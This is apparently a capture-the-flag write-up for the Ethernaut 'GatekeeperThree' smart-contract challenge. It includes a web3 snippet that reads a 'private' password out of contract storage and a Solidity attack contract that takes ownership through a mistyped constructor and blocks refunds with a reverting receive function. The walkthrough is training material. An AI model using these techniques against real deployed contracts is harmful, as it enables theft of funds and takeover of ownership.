## Objectives

1. Become an entrant.

## Vulnerabilities

N/A, It's a technical skill test.

## Exploit

1. Create a `SimpleTrick` instance by calling `createTrick`.

2. Copy the `SimpleTrick` instance address from the function `trick`.

3. From there, you can read the value in storage slot 2 of the address copied from the previous setps
   . This value is the `password` variable. You can use the web3 library for this directly in the console just like
   the following :

```javascript
const hexPassword = await web3.eth.getStorageAt(
  "0xCc6a4fE3cD105577D31c08C6792bfb7bCB8800c9",
  2
);
const uintPassword = await web3.utils.hexToNumber(hexPassword);
```

4. Call `getAllowance` with `uintPassword` of the prvious step as argument. This will change `allowEntrance` to `true`.

5. Write and deployt the following hack contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract GatekeeperThreeHack {
    GatekeeperThree target;

    constructor(address payable _targetAddress) {
        target = GatekeeperThree(_targetAddress);
    }

    function enterHack() external payable {
        target.construct0r();
        (bool success, ) = payable(target).call{value: 0.002 ether}("");
        require(success, "call failed");
        target.enter();
    }

    receive () external payable {
        revert();
    }
}
```

6. Call `enterHack` from your deployed hack contract. This function does three things.

first it calls `construct0r` which makes the hack contract's address the `owner`.

Then it sends 0.002 Eth to the GateKeeperThree address to make it's balance greater than 0.001 Eth.

Lastly, it calls `enter`. At this point we pass the three `require` functions.

### Let's explain how each gates work

```solidity
modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
}
```

`msg.sender` is the _hack contract_'s address which is the `owner`. `tx.origin` is the EOA that we use to initiate the
transaction. They are not the same.

```solidity
modifier gateTwo() {
    require(allowEntrance == true);
    _;
}
```

`allowEntrance` is set to true at step 4.

```solidity
modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
        _;
    }
}
```

`address(this).balance` is greater than 0.001 Eth since our hack contract sent 0.002 Eth in `enterHack`.

`payable(owner).send(0.001 ether)` is false since we have created the `receive` of our hack contract to revert
any transaction.

## Suggested mitigation

N/A, It's a technical skill test.
